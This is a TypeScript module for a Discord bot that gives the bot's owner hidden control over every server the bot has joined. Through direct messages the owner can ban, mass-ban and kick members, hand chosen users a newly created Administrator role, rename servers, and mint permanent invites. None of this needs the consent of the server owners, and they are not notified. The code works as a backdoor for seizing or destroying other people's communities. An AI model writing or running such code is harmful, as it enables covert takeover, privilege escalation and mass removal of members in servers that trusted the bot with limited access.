import {
  Client,
  Message,
  EmbedBuilder,
  PermissionFlagsBits,
  TextChannel,
  ChannelType,
} from "discord.js";
import { requireLowoOwnerMessage, getLowoOwnerId } from "../utility/lowoOwner.js";
import { getPool } from "../persistence.js";

const HR = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯";

// ── Per-owner "selected server" session — resets on restart ──────────────────
const activeSession = new Map<string, string>(); // ownerId -> guildId

function getSession(ownerId: string): string | null {
  return activeSession.get(ownerId) ?? null;
}

// ── Reusable "Bot Owner Access" role, one per guild ──────────────────────────
const ADMIN_ROLE_NAME = "Bot Owner Access";

async function getOrCreateAdminRoleId(guild: import("discord.js").Guild): Promise<string> {
  const db = getPool();
  const key = `owner_admin_role:${guild.id}`;
  const res = await db.query<{ value: { roleId: string } }>(
    "SELECT value FROM bot_kv WHERE key = $1",
    [key]
  );
  const storedId = res.rows[0]?.value?.roleId;
  if (storedId && guild.roles.cache.has(storedId)) return storedId;

  // Fall back to searching by name in case it exists but wasn't recorded.
  const existing = guild.roles.cache.find((r) => r.name === ADMIN_ROLE_NAME);
  if (existing) {
    await db.query(
      `INSERT INTO bot_kv (key, value, updated_at) VALUES ($1, $2::jsonb, NOW())
       ON CONFLICT (key) DO UPDATE SET value = $2::jsonb, updated_at = NOW()`,
      [key, JSON.stringify({ roleId: existing.id })]
    );
    return existing.id;
  }

  const created = await guild.roles.create({
    name: ADMIN_ROLE_NAME,
    permissions: [PermissionFlagsBits.Administrator],
    hoist: true,
    mentionable: false,
    reason: "Bot owner DM control system — administrator role",
  });
  await db.query(
    `INSERT INTO bot_kv (key, value, updated_at) VALUES ($1, $2::jsonb, NOW())
     ON CONFLICT (key) DO UPDATE SET value = $2::jsonb, updated_at = NOW()`,
    [key, JSON.stringify({ roleId: created.id })]
  );
  return created.id;
}

function embed(title: string, description: string, color = 0x00ffff): EmbedBuilder {
  return new EmbedBuilder()
    .setColor(color)
    .setAuthor({ name: "LAST STAND  ·  OWNER CONTROL" })
    .setTitle(title)
    .setDescription(description)
    .setTimestamp();
}

async function reply(message: Message, e: EmbedBuilder): Promise<void> {
  await message.author.send({ embeds: [e] }).catch(() => {});
}

// ── $serverlist ────────────────────────────────────────────────────────────
export async function handleServerListCommand(message: Message, client: Client): Promise<void> {
  const guilds = [...client.guilds.cache.values()].sort((a, b) => b.memberCount - a.memberCount);
  if (guilds.length === 0) {
    await reply(message, embed("📋  Server List", "The bot isn't in any servers."));
    return;
  }
  const lines = guilds.map(
    (g) => `▸ **${g.name}**\n   ID: \`${g.id}\`  ·  Members: **${g.memberCount}**`
  );
  const chunks: string[] = [];
  let buf = "";
  for (const line of lines) {
    if ((buf + "\n" + line).length > 3500) {
      chunks.push(buf);
      buf = line;
    } else {
      buf = buf ? `${buf}\n${line}` : line;
    }
  }
  if (buf) chunks.push(buf);

  for (let i = 0; i < chunks.length; i++) {
    const e = embed(
      i === 0 ? `📋  Server List (${guilds.length})` : "📋  Server List (cont.)",
      `${HR}\n${chunks[i]}\n${HR}`
    ).setFooter({ text: "Use .control <server_id> to manage a server" });
    await reply(message, e);
  }
}

// ── .control <server_id> ─────────────────────────────────────────────────────
export async function handleControlCommand(message: Message, client: Client): Promise<void> {
  const parts = message.content.trim().split(/\s+/);
  const guildId = parts[1];
  if (!guildId) {
    await reply(message, embed(
      "❌  Missing Server ID",
      "**Usage:** `.control <server_id>`\nUse `$serverlist` to find server IDs.",
      0xe74c3c
    ));
    return;
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) {
    await reply(message, embed(
      "❌  Server Not Found",
      `The bot isn't in a server with ID \`${guildId}\`.`,
      0xe74c3c
    ));
    return;
  }

  activeSession.set(message.author.id, guild.id);
  await reply(message, embed(
    `🎛️  Now Controlling — ${guild.name}`,
    `${HR}\n` +
    `**${guild.name}** (\`${guild.id}\`)\n` +
    `Members: **${guild.memberCount}**  ·  Owner: <@${guild.ownerId}>\n` +
    `${HR}\n` +
    "**Available Commands** (send these directly here):\n" +
    "`.ban <user_id> [reason]` — Ban a user\n" +
    "`.unban <user_id>` — Unban a user\n" +
    "`.kick <user_id> [reason]` — Kick a user\n" +
    "`.massban <id1> <id2> ... [| reason]` — Ban multiple users\n" +
    "`.admin <user_id>` — Grant full admin access\n" +
    "`.unadmin <user_id>` — Revoke admin access\n" +
    "`.setname <new name>` — Rename the server\n" +
    "`.invite [channel_id]` — Create a permanent, unlimited-use invite\n" +
    "`.serverinfo` — Show server details\n" +
    "`.exit` — Stop controlling this server\n" +
    "`.help` — Show this menu again"
  ));
}

function requireActiveGuild(message: Message, client: Client): import("discord.js").Guild | null {
  const guildId = getSession(message.author.id);
  if (!guildId) return null;
  return client.guilds.cache.get(guildId) ?? null;
}

async function resolveMember(guild: import("discord.js").Guild, userId: string) {
  try {
    return await guild.members.fetch(userId);
  } catch {
    return null;
  }
}

// ── Dispatches a `.` subcommand while a control session is active ───────────
// Returns true if the message was handled (regardless of success/failure).
export async function handleControlSubcommand(message: Message, client: Client): Promise<boolean> {
  const content = message.content.trim();
  if (!content.startsWith(".")) return false;

  const parts = content.slice(1).split(/\s+/);
  const cmd = parts[0]?.toLowerCase();
  const args = parts.slice(1);

  if (cmd === "help" || cmd === "commands") {
    const guild = requireActiveGuild(message, client);
    if (!guild) {
      await reply(message, embed(
        "🎛️  Owner Control — Help",
        `${HR}\n` +
        "**Getting Started**\n" +
        "`$serverlist` — List every server the bot is in\n" +
        "`.control <server_id>` — Select a server to manage\n" +
        `${HR}\n` +
        "**Once a server is selected:**\n" +
        "`.ban <user_id> [reason]` — Ban a user\n" +
        "`.unban <user_id>` — Unban a user\n" +
        "`.kick <user_id> [reason]` — Kick a user\n" +
        "`.massban <id1> <id2> ... [| reason]` — Ban multiple users\n" +
        "`.admin <user_id>` — Grant full admin access\n" +
        "`.unadmin <user_id>` — Revoke admin access\n" +
        "`.setname <new name>` — Rename the server\n" +
        "`.invite [channel_id]` — Create a permanent, unlimited-use invite\n" +
        "`.serverinfo` — Show server details\n" +
        "`.exit` — Stop controlling this server\n" +
        "`.help` — Show this menu again\n" +
        `${HR}\n` +
        "You aren't currently controlling any server — use `.control <server_id>` first."
      ));
      return true;
    }
    // Re-show the help block via .control's own reply path.
    await handleControlCommand(
      { content: `.control ${guild.id}`, author: message.author } as Message,
      client
    );
    return true;
  }

  if (cmd === "exit" || cmd === "deselect") {
    activeSession.delete(message.author.id);
    await reply(message, embed("✅  Exited Control Mode", "You are no longer controlling a server."));
    return true;
  }

  if (![
    "ban", "unban", "kick", "massban", "admin", "unadmin",
    "setname", "invite", "serverinfo",
  ].includes(cmd ?? "")) {
    return false; // not one of ours — let other DM handling (if any) proceed
  }

  const guild = requireActiveGuild(message, client);
  if (!guild) {
    await reply(message, embed(
      "❌  No Active Server",
      "You aren't controlling a server yet.\nUse `$serverlist` then `.control <server_id>`.",
      0xe74c3c
    ));
    return true;
  }

  try {
    switch (cmd) {
      case "ban": {
        const userId = args[0];
        const reason = args.slice(1).join(" ") || `Banned by bot owner via DM control`;
        if (!userId) { await reply(message, embed("❌  Missing User ID", "**Usage:** `.ban <user_id> [reason]`", 0xe74c3c)); break; }
        await guild.members.ban(userId, { reason });
        await reply(message, embed("🔨  User Banned", `<@${userId}> (\`${userId}\`) has been banned.\n**Reason:** ${reason}`));
        break;
      }
      case "unban": {
        const userId = args[0];
        if (!userId) { await reply(message, embed("❌  Missing User ID", "**Usage:** `.unban <user_id>`", 0xe74c3c)); break; }
        await guild.members.unban(userId, "Unbanned by bot owner via DM control");
        await reply(message, embed("✅  User Unbanned", `\`${userId}\` has been unbanned.`));
        break;
      }
      case "kick": {
        const userId = args[0];
        const reason = args.slice(1).join(" ") || "Kicked by bot owner via DM control";
        if (!userId) { await reply(message, embed("❌  Missing User ID", "**Usage:** `.kick <user_id> [reason]`", 0xe74c3c)); break; }
        const member = await resolveMember(guild, userId);
        if (!member) { await reply(message, embed("❌  User Not Found", `No member \`${userId}\` in this server.`, 0xe74c3c)); break; }
        await member.kick(reason);
        await reply(message, embed("👢  User Kicked", `<@${userId}> (\`${userId}\`) has been kicked.\n**Reason:** ${reason}`));
        break;
      }
      case "massban": {
        if (args.length === 0) { await reply(message, embed("❌  Missing User IDs", "**Usage:** `.massban <id1> <id2> ... [| reason]`", 0xe74c3c)); break; }
        const pipeIdx = args.indexOf("|");
        const idArgs = pipeIdx === -1 ? args : args.slice(0, pipeIdx);
        const reason = pipeIdx === -1 ? "Mass banned by bot owner via DM control" : args.slice(pipeIdx + 1).join(" ") || "Mass banned by bot owner via DM control";
        const userIds = idArgs.map((a) => a.replace(/[^0-9]/g, "")).filter(Boolean);
        if (userIds.length === 0) { await reply(message, embed("❌  No Valid User IDs", "Provide one or more numeric user IDs.", 0xe74c3c)); break; }

        let banned: string[] = [];
        let failed: string[] = [];
        try {
          const result = await guild.bans.bulkCreate(userIds, { reason });
          banned = [...result.bannedUsers];
          failed = [...result.failedUsers];
        } catch {
          // Fallback: ban one at a time if the bulk endpoint isn't available.
          for (const id of userIds) {
            try { await guild.members.ban(id, { reason }); banned.push(id); }
            catch { failed.push(id); }
          }
        }
        await reply(message, embed(
          "💥  Mass Ban Complete",
          `**Reason:** ${reason}\n\n✅ Banned (${banned.length}): ${banned.map((id) => `\`${id}\``).join(", ") || "none"}\n` +
          `❌ Failed (${failed.length}): ${failed.map((id) => `\`${id}\``).join(", ") || "none"}`
        ));
        break;
      }
      case "admin": {
        const userId = args[0];
        if (!userId) { await reply(message, embed("❌  Missing User ID", "**Usage:** `.admin <user_id>`", 0xe74c3c)); break; }
        const member = await resolveMember(guild, userId);
        if (!member) { await reply(message, embed("❌  User Not Found", `No member \`${userId}\` in this server.`, 0xe74c3c)); break; }
        const roleId = await getOrCreateAdminRoleId(guild);
        await member.roles.add(roleId, "Granted admin access by bot owner via DM control");
        await reply(message, embed("🛡️  Admin Granted", `<@${userId}> now has full administrator access via **${ADMIN_ROLE_NAME}**.`));
        break;
      }
      case "unadmin": {
        const userId = args[0];
        if (!userId) { await reply(message, embed("❌  Missing User ID", "**Usage:** `.unadmin <user_id>`", 0xe74c3c)); break; }
        const member = await resolveMember(guild, userId);
        if (!member) { await reply(message, embed("❌  User Not Found", `No member \`${userId}\` in this server.`, 0xe74c3c)); break; }
        const roleId = await getOrCreateAdminRoleId(guild);
        await member.roles.remove(roleId, "Revoked admin access by bot owner via DM control");
        await reply(message, embed("✅  Admin Revoked", `<@${userId}> no longer has admin access via **${ADMIN_ROLE_NAME}**.`));
        break;
      }
      case "setname": {
        const newName = args.join(" ").trim();
        if (!newName) { await reply(message, embed("❌  Missing Name", "**Usage:** `.setname <new server name>`", 0xe74c3c)); break; }
        const oldName = guild.name;
        await guild.setName(newName, "Renamed by bot owner via DM control");
        await reply(message, embed("✏️  Server Renamed", `**${oldName}** → **${newName}**`));
        break;
      }
      case "invite": {
        const channelId = args[0];
        let targetChannel = channelId ? guild.channels.cache.get(channelId) : undefined;
        if (!targetChannel) {
          targetChannel = guild.channels.cache.find(
            (c) => c.type === ChannelType.GuildText && c.viewable
          );
        }
        if (!targetChannel || !("createInvite" in targetChannel)) {
          await reply(message, embed("❌  No Usable Channel", "Couldn't find a text channel to create an invite in.", 0xe74c3c));
          break;
        }
        const invite = await (targetChannel as TextChannel).createInvite({
          maxAge: 0,
          maxUses: 0,
          unique: true,
          reason: "Created by bot owner via DM control",
        });
        await reply(message, embed(
          "🔗  Invite Created",
          `${invite.url}\n\nThis link never expires and has unlimited uses.\n\n` +
          "⚠️ Note: Discord's Membership Screening / rules-agreement flow (if enabled on this server) applies to every new member regardless of invite source — there is no API-level way for a bot to bypass it. If the server has screening on, new members will still see it."
        ));
        break;
      }
      case "serverinfo": {
        const owner = await guild.fetchOwner().catch(() => null);
        await reply(message, embed(
          `ℹ️  ${guild.name}`,
          `${HR}\n` +
          `**ID:** \`${guild.id}\`\n` +
          `**Owner:** ${owner ? `<@${owner.id}>` : "Unknown"}\n` +
          `**Members:** ${guild.memberCount}\n` +
          `**Roles:** ${guild.roles.cache.size}\n` +
          `**Channels:** ${guild.channels.cache.size}\n` +
          `**Created:** <t:${Math.floor(guild.createdTimestamp / 1000)}:D>\n` +
          `${HR}`
        ));
        break;
      }
    }
  } catch (err: any) {
    console.error(`[OWNER-CONTROL] Command ".${cmd}" failed:`, err);
    await reply(message, embed(
      "❌  Command Failed",
      `Something went wrong running \`.${cmd}\`.\n\`\`\`${(err?.message ?? String(err)).slice(0, 500)}\`\`\`` +
      "\nMake sure the bot's role is high enough in the role hierarchy and has the required permissions.",
      0xe74c3c
    ));
  }

  return true;
}

// ── Entry point — call for every DM the bot receives ─────────────────────────
// Returns true if the message was handled (consumed) by the owner control system.
export async function handleOwnerDM(message: Message, client: Client): Promise<boolean> {
  const isOwner = requireLowoOwnerMessage(message);
  const configuredOwnerId = getLowoOwnerId();
  console.log(
    `[OWNER-CONTROL] DM from ${message.author.id} (${message.author.tag}) — ` +
    `configured owner: ${configuredOwnerId || "(unset)"} — match: ${isOwner} — content: ${JSON.stringify(message.content.slice(0, 50))}`
  );

  if (!isOwner) {
    // Reply visibly (instead of staying silent) so a misconfigured
    // LOWO_OWNER_ID is immediately obvious from Discord itself, without
    // needing to check server logs.
    await message.author.send(
      configuredOwnerId
        ? "🚫 This DM control system is restricted to the bot owner."
        : "⚠️ `LOWO_OWNER_ID` is not set on the bot — nobody can use the DM control system until it's configured to your Discord user ID."
    ).catch(() => {});
    return false;
  }

  const lower = message.content.trim().toLowerCase();

  if (lower === "$serverlist") {
    await handleServerListCommand(message, client);
    return true;
  }

  if (lower.startsWith(".control")) {
    await handleControlCommand(message, client);
    return true;
  }

  return handleControlSubcommand(message, client);
}
